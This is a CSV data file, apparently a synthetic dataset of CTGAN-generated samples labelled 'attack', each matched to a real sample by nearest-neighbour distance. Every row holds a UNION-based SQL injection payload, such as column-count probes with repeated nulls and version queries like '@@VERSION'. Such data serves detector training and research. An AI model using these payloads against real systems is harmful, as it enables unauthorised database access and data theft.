id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000001,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000086,6.028168309523616
CTGAN_000002,attack,union,"-5528'  )   union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",nearest_attack_euclidean,R000120,4.966187419837322
CTGAN_000003,attack,union," select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000018,6.810084279627722
CTGAN_000004,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000309,7.29710354141087
CTGAN_000005,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000110,5.901474418405652
CTGAN_000006,attack,union,"-9859""   )    )     )   union all select 6595,6595,6595,6595,6595,6595,6595#",nearest_attack_euclidean,R000055,6.710777353281023
CTGAN_000007,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000160,6.761925038840758
CTGAN_000008,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R000262,6.9178968218884105
CTGAN_000009,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000302,6.626426849758783
CTGAN_000010,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000086,5.679575417165351
CTGAN_000011,attack,union," select * from users where id  =  1.  union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000030,5.078413918678224
CTGAN_000012,attack,union,"-6815  )   where 2498  =  2498 union all select 2498,2498,2498,2498,2498--",nearest_attack_euclidean,R000259,5.031056609262793
CTGAN_000013,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000160,5.345574252692084
CTGAN_000014,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000286,5.257416643541901
CTGAN_000015,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000188,6.307491501195934
CTGAN_000016,attack,union," select * from users where id  =  1.<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000025,6.471258803240841
CTGAN_000017,attack,union,"-4825%'  )   union all select 6804,6804,6804,6804,6804,6804,6804--",nearest_attack_euclidean,R000166,7.3677486797881455
CTGAN_000018,attack,union,"-6815  )   where 2498  =  2498 union all select 2498,2498,2498,2498,2498--",nearest_attack_euclidean,R000259,6.1727656561131745
CTGAN_000019,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000148,5.3513499730587
CTGAN_000020,attack,union,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",nearest_attack_euclidean,R000065,6.812445512633321
CTGAN_000021,attack,union,"1""   )    )    as mlid where 1047  =  1047 union all select null,null#",nearest_attack_euclidean,R000075,5.990577597062114
CTGAN_000022,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000068,4.895678920273793
CTGAN_000023,attack,union,"-3130  )   union all select 1741,1741,1741,1741,1741,1741,1741,1741#",nearest_attack_euclidean,R000119,9.194109945911267
CTGAN_000024,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000249,4.94944249779505
CTGAN_000025,attack,union," select * from users where id  =  1.*\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000049,8.688929663322822
CTGAN_000026,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000290,5.640675400363
CTGAN_000027,attack,union,"1'  )   where 9091  =  9091 union all select null,null,null,null#",nearest_attack_euclidean,R000225,5.674075175161855
CTGAN_000028,attack,union,"-1187'  )   union all select 8202,8202,8202,8202,8202,8202,8202#",nearest_attack_euclidean,R000173,4.849621071167689
CTGAN_000029,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000042,8.125925414763733
CTGAN_000030,attack,union,"-9315'   )    )     )   union all select 5057,5057,5057,5057,5057#",nearest_attack_euclidean,R000149,6.544355626742593
CTGAN_000031,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000176,3.912336975105773
CTGAN_000032,attack,union,"-6815  )   where 2498  =  2498 union all select 2498,2498,2498,2498,2498--",nearest_attack_euclidean,R000259,8.089183850724485
CTGAN_000033,attack,union,"1' in boolean mode  )   union all select null,null,null#",nearest_attack_euclidean,R000254,10.30041558205563
CTGAN_000034,attack,union,"-1059""  )   union all select 1276,1276,1276,1276,1276,1276,1276,1276#",nearest_attack_euclidean,R000279,7.34697472166608
CTGAN_000035,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R000241,3.7929050748883117
